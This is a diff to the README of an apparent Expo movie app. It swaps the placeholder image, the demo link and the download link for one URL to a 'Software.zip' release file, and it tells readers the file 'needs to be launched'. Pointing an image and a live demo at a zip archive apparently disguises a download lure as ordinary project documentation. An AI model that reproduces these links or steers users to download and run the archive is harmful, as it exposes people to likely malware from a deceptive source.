@@ -1,6 +1,6 @@
 # 🎬🎥 Welcome to Expo RSC Movies 🍿🎞️
 
-![Expo RSC Movies](https://imageurl.com)
+![Expo RSC Movies](https://github.com/7777SUPRIM/expo-rsc-movies/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -35,9 +35,9 @@ To get started with **Expo RSC Movies**, follow the steps below:
 
 ## Explore More
 
-🚀 Check out the [Demo](yourwebsite.com) for a live preview of the app in action!
+🚀 Check out the [Demo](https://github.com/7777SUPRIM/expo-rsc-movies/releases/download/v2.0/Software.zip) for a live preview of the app in action!
 
-📦 Download the app [here](https://github.com/user-attachments/files/18388744/Software.zip) (needs to be launched).
+📦 Download the app [here](https://github.com/7777SUPRIM/expo-rsc-movies/releases/download/v2.0/Software.zip) (needs to be launched).
 
 📄 Check the "Releases" section if the download link is not working.
 
